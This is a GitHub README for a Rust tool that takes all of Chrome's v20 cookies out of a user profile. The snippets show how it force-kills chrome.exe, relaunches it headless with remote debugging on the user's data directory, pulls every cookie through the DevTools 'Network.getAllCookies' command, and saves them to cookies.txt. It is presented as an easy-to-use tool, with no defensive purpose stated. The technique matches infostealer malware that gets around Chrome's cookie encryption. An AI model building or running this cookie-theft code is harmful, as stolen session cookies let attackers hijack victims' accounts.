## decrypt_v20_chrome_cookies
🚀 This repository **is a simple Rust project** for retrieving **Chrome v20 cookies.**

## 📌 Features
- Retrieve cookies v20 from **Chrome Debugger**
- **Simple and lightweight** Rust implementation
- **Easy** to use

## 🛠️ How It Works
This project uses **Rust** to retrieve **Chrome v20 cookies** using chrome debugging. Here are the main steps:
- **Checks if the program 'chrome.exe' is running**: If it does, it closes it automatically.
```rust
fn verify_chrome() {
    let verify_chrome = Command::new("cmd.exe")
            .arg("/C")
            .arg("tasklist")
            .output()
            .unwrap();

    let result1 = String::from_utf8_lossy(&verify_chrome.stdout);

    if result1.contains("chrome.exe") {
        let _ = Command::new("taskkill")
                .arg("/F")
                .arg("/IM")
                .arg("chrome.exe")
                .output()
                .unwrap();


        thread::sleep(Duration::from_secs(2)); 
    }
}
```

- **Launches the Chrome Debugger**: Start Chrome in headless mode with remote debugging enabled.
```rust
let _ = Command::new(path_chrome)
            .arg(format!("--remote-debugging-port={}", port_debugging))
            .arg("--remote-allow-origins=*")
            .arg("--headless")
            .arg(format!("--user-data-dir={}", path_user))
            .stdout(Stdio::null()) 
            .stderr(Stdio::null())
            .spawn()?;
```

- **Connect to Debugging Interface**: Use ```reqwest``` to retrieve the ```webSocketDebuggerUrl``` for WebSocket communication.
```rust
let resp = reqwest::blocking::get(format!("http://localhost:{}/json", port_debugging))?;
let ws_url = json[0]["webSocketDebuggerUrl"].as_str().unwrap().to_string();
```

- **Retrieve Cookies**: Send a command to fetch all cookies via WebSocket.
```rust
let (mut socket, _) = connect(ws_url)?;
let data = serde_json::json!({ "id": 1, "method": "Network.getAllCookies" });
socket.send(Message::Text(data.to_string()))?;
```

- **Store Cookies**: Write the retrieved cookies to ```cookies.txt```

- **Clean Up**: Terminate the Chrome process to clean up resources.
```rust
let _ = Command::new("taskkill")
            .arg("/F")
            .arg("/IM")
            .arg("chrome.exe")
            .output()
            .unwrap();
```

## 📥 Installation
Make sure you have **Rust** installed. If not, you can install it via this website [rust](https://www.rust-lang.org/fr/tools/install):       
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```
Then, clone this repository and build the project:
```
git clone https://github.com/exiton0x/decrypt_v20_chrome_cookies
cd decrypt_v20_chrome_cookies
cargo build --release
```

## 🚀 Usage
```
cargo run
```
Or use the compiled binary:
```
target/release/
```

## 🎉 Acknowledgments
- Inspired by various open-source **Chrome cookie** retrieval projects.

